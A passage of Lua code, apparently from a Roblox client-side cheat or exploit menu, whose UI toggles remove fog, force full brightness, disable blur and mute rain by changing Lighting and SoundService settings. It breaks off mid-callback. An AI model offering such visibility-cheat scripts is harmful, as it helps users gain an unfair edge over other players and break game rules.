-- LIGHTING ORIGINALS
-- ============================================================
local originalFogEnd       = Lighting.FogEnd
local originalFogStart     = Lighting.FogStart
local originalFogColor     = Lighting.FogColor
local originalAmbient      = Lighting.Ambient
local originalOutdoorAmbient = Lighting.OutdoorAmbient
local originalBrightness   = Lighting.Brightness

-- ============================================================
-- AMBIANCE CALLBACKS
-- ============================================================
Toggles.NoFog:OnChanged(function()
    if Toggles.NoFog.Value then Lighting.FogEnd=1e6; Lighting.FogStart=1e6
    else Lighting.FogEnd=originalFogEnd; Lighting.FogStart=originalFogStart end
end)

Toggles.DisableRain:OnChanged(function()
    local ss = game:GetService("SoundService")
    local rain = ss:FindFirstChild("Rain")
    if rain and rain:IsA("Sound") then
        rain.Looped = not Toggles.DisableRain.Value
        if Toggles.DisableRain.Value then rain:Stop() end
    end
end)

Toggles.FullBright:OnChanged(function()
    if Toggles.FullBright.Value then
        Lighting.Ambient=Color3.new(1,1,1); Lighting.OutdoorAmbient=Color3.new(1,1,1); Lighting.Brightness=2
    else
        Lighting.Ambient=originalAmbient; Lighting.OutdoorAmbient=originalOutdoorAmbient; Lighting.Brightness=originalBrightness
    end
end)

Toggles.NoBlur:OnChanged(function()
    for _, e in pairs(Lighting:GetChildren()) do
        if e:IsA("BlurEffect") or e:IsA("DepthOfFieldEffect") then e.Enabled = not Toggles.NoBlur.Value end
    end
end)

Toggles.NoSunRays:OnChanged(function()
    for _, e in pairs(Lighting:GetChildren()) do
